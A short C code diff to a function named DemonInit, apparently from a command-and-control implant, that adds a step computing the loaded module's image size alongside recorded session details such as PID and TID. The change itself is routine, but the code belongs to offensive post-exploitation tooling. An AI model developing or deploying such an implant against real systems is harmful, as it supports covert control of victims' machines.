@@ -487,6 +487,10 @@ VOID DemonInit( PVOID ModuleInst )
         Instance.Session.ModuleBase = LdrModulePeb( 0 );
     }
 
+    if ( Instance.Session.ModuleBase ) {
+        Instance.Session.ModuleSize = IMAGE_SIZE( Instance.Session.ModuleBase );
+    }
+
     Instance.Session.OS_Arch   = SystemInfo.ProcessorArchitecture;
     Instance.Session.PID       = U_PTR( Instance.Teb->ClientId.UniqueProcess );
     Instance.Session.TID       = U_PTR( Instance.Teb->ClientId.UniqueThread );
